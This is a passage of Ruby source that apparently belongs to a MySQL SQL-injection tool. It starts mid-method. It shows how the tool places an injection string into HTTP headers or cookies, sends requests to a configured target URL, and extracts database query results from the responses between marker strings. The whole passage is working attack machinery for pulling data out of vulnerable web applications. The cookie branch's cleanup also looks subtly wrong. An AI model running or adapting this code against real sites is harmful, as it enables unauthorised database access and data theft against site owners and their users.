      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['REFERER'] = original_ref

    when 'HEADER'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end

    when 'COOKIE'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end
    end


    # Now we check response for our results
    # Return findings to caller or return nil
    if res[0] =~ /#{Regexp.escape(m1)}(.+)#{Regexp.escape(m2)}/m
      query_results = $1
      if query_results =~ /#{Regexp.escape(m2)}/
        query_results = query_results.to_s.sub(/#{Regexp.escape(m2)}.+/m, '')
      end
      return query_results
    else
      return nil
    end
  end
end
